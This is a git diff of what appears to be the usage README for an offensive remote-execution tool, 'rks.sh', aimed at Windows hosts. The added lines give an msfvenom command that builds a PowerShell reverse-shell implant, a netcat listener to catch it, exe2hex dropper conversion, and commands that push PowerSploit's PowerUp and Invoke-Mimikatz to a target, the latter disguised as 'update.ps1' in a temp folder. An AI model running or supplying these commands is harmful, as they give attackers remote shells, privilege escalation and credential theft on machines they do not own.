@@ -40,12 +40,14 @@ $ ./rks.h -c recon_cmds.txt
 - Execute an implant while reading the contents of the payload in powershell.
 
 ```
+$ msfvenom -p windowx/x64/shell_reverse_tcp lhost=<IP> lport=4444 -f psh -o implant.ps1
+
 $ ./rks.sh -c implant.ps1
 
 $ nc -lvnp 4444
 ```
 
-- Execute a dropper implant by converting the EXE to hexadecimal using `exe2hex`.
+- Execute a dropper implant by converting the EXE to hexadecimal using `exe2hex` (Doesn't work).
 
 ```
 $ exe2hex -x implant.exe -p implant.bat
@@ -55,11 +57,15 @@ $ ./rks.sh -c implant.bat
 
 ### File Transfer
 
-- Transfer a file remotely when pivoting in a isolated network.
+- Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes.
 
-`$ ./rks.sh -i /us/share/powersploit/Exfiltration/Invoke-Mimikatz.ps1 -o C:\Windows\Temp\update.ps1`
+```
+$ ./rks.sh -i /usr/share/powersploit/Privesc/PowerUp.ps1 -o script.ps1
 
-- Transfer and install tools with `plink.exe` for example.
+$ ./rks.sh -i /usr/share/powersploit/Exfiltration/Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1"
+```
+
+- Transfer and install tools with `plink.exe` for example (Does't work).
 
 ```
 $ exe2hex -x plink.exe -p plink.bat
